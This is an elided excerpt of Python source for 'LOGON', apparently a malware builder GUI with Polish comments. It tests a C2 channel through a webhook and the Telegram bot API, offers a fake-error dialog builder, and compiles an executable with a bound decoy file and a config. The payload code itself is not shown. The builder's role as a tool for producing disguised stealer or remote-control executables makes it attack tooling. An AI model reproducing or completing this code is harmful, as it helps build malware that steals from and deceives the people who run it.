    ...
    def testC2ButtonControl_Callback(self) -> None:
        ...
        def check():
            ...
            if self.C2Mode == 0:
                ...
                try:
                    data = json.dumps({"content" : "LOGON webhook is working!"}).encode()
                    ...
                    status = http.status
                    if status == 204:
                        messagebox.showinfo("Success", "LOGON Webhook operational.!")
                    else:
                ...
                try:
                    http = PoolManager(cert_reqs="CERT_NONE")
                    if http.request("GET", "https://api.telegram.org/bot%s/sendMessage?chat_id=%s&text=%s" % (token, chat_id, quote("Your endpoint is g!"))).status == 200:
                        messagebox.showinfo("Success", "LOGON endpoint operational.")
                        return
                except Exception as e:
                    print(e)
...
class FakeErrorBuilder(ctk.CTkToplevel):
    ...
    def __init__(self, master) -> None:
        super().__init__(master)
        self.title("LOGON [Fake Error Builder]")
        self.after(200, lambda: self.iconbitmap(os.path.join("Extras", "icon.ico")))
        self.grab_set()
...
class Builder(ctk.CTk):
    ...
    def __init__(self) -> None:
        ...
        self.titleLabel = ctk.CTkLabel(self, text= "LOGON", font= ctk.CTkFont(size= 68, weight= "bold"), text_color= "#2F58CD")
    ...
    def BuildExecutable(self, config: str, iconFileBytes: bytes, boundFilePath: str) -> None:
        ...
        # Zakomentuj całą sekcję tworzenia venv
        ...
        print(format("\u001b[33;1mINFO", "Copying assets..."))
        
        # Kopiuj pliki do głównego folderu zamiast do env\Scripts
        for i in os.listdir(datadir := os.path.join(os.path.dirname(__file__), "Components")):
            if os.path.isfile(fileloc := os.path.join(datadir, i)):
                shutil.copyfile(fileloc, i)
            else:
                shutil.copytree(fileloc, i)

        with open("config.json", "w", encoding= "utf-8", errors= "ignore") as file:
            file.write(config)

        if iconFileBytes:
            with open("icon.ico", "wb") as iconFile:
                iconFile.write(iconFileBytes)

        if boundFilePath:
            shutil.copyfile(boundFilePath, "bound.exe")

        clear()

        # Uruchom process.py z głównego folderu (usuń chdir do env\Scripts)
        # os.chdir(os.path.join("env", "Scripts"))  # Usuń tę linię
        process = subprocess.Popen("python process.py", shell= True)
        process.wait()
